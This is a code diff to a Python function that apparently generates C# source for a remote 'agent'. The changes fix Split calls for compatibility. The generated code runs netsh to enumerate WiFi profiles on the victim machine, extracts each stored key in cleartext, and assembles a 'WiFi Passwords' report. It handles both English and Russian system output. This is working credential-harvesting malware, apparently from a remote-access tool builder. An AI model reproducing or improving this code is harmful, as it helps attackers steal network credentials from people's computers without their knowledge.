@@ -2050,9 +2050,9 @@ def generate_agent_source(bc):
         "                        p.WaitForExit(10000);\n"
         "                        var sb = new StringBuilder();\n"
         '                        sb.AppendLine("=== WiFi Passwords ===");\n'
-        "                        foreach (string line in output.Split('\\n')) {\n"
+        "                        foreach (string line in output.Split(new char[] { '\\n' })) {\n"
         '                            if (line.Contains(":") && (line.Contains("All User Profile") || line.Contains("\\u0412\\u0441\\u0435"))) {\n'
-        "                                string profile = line.Split(':').Last().Trim();\n"
+        "                                string profile = line.Split(new char[] { ':' }).Last().Trim();\n"
         "                                if (string.IsNullOrEmpty(profile)) continue;\n"
         "                                var kpsi = new ProcessStartInfo {\n"
         '                                    FileName = "netsh",\n'
@@ -2065,9 +2065,9 @@ def generate_agent_source(bc):
         "                                string kout = kp.StandardOutput.ReadToEnd();\n"
         "                                kp.WaitForExit(5000);\n"
         '                                string key = "";\n'
-        "                                foreach (string kl in kout.Split('\\n')) {\n"
+        "                                foreach (string kl in kout.Split(new char[] { '\\n' })) {\n"
         '                                    if (kl.Contains("Key Content") || kl.Contains("\\u0421\\u043e\\u0434\\u0435\\u0440\\u0436\\u0438\\u043c\\u043e\\u0435 \\u043a\\u043b\\u044e\\u0447\\u0430")) {\n'
-        "                                        key = kl.Split(':').Last().Trim();\n"
+        "                                        key = kl.Split(new char[] { ':' }).Last().Trim();\n"
         "                                    }\n"
         "                                }\n"
         '                                sb.AppendFormat("{0,-30} : {1}\\n", profile, key);\n'
